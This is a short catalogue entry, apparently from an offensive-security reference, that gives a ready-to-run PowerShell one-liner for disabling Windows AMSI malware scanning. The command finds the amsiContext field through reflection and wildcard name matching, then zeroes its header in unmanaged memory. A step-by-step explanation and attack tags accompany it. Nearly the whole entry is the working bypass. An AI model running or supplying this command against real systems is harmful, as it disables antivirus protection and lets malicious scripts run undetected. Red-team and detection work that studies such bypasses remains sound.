---
description: |
  One-liner to bypass the AMSI in a Powershell. Done by overwriting the amsiContext header by copying data (four zeros) from managed to unmanaged memory. When the context structure header is overwritten, this should force AmsiOpenSession to error out.

  Command Reference:
  ```
  loop the GetTypes method, searching for all types containing the string “iUtils” in its name

  GetFields accepts filtering modifiers, we’ll apply the NonPublic and Static filters to help narrow the results

  loop through all the fields, searching for a name containing “Context”, as this does not be marked as malicious looking for the amsiContext

  use Copy to overwrite the amsiContext header by copying data (four zeros) from managed to unmanaged memory
  ```
command: |
  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

items:
  - Shell
services:
  - AV
OS:
  - Windows
attack_types:
  - Bypassing
references:
  - https://gist.github.com/D3Ext/bf57673644ba08e729f65892e0dae6c4
---